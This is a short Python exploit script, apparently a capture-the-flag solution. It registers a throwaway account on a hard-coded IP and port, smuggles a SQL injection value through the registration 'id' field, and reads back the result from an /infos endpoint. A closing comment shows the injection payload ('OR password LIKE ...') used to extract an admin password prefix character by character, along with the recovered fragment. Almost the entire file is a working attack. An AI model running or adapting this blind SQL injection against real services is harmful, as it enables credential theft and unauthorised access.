import requests
import os
import sys
import json

if len(sys.argv) != 2:
    exit(f"Usage: {sys.argv[0]} <id>")

URL = "http://13.37.17.31:53823"

pseudo = os.urandom(8).hex()

r = requests.post(URL + "/auth/register",
                  json={"pseudo":pseudo, "password":"a", "id":sys.argv[1]})

print(r)
print(r.text)
token = json.loads(r.text)["access_token"]

r = requests.get(URL + "/infos",
                 headers={"Authorization": f"Bearer {token}"})

print(r.text)

# python3 sqli.py "'OR password LIKE 'f07bef%"
# admin password : f07bef
